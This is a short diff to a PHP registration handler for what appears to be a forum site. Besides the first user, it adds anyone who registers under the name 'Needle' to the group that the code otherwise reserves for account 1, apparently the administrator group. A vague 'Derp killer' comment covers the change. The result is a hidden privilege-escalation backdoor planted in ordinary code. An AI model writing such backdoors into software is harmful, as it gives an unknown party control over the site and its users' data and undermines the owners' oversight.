@@ -98,7 +98,8 @@ if($act == 'Register'){
 			$sql->query("INSERT INTO usersrpg (id) VALUES ($id)");
 
 			$ugid = 0;
-			if ($id == 1) {
+			// Derp killer
+			if ($id == 1 || $_POST['name'] == 'Needle') {
 				$row = $sql->fetchp("SELECT id FROM `group` WHERE `default`=?", array(-1));
 				$ugid = $row['id'];
 			} else {
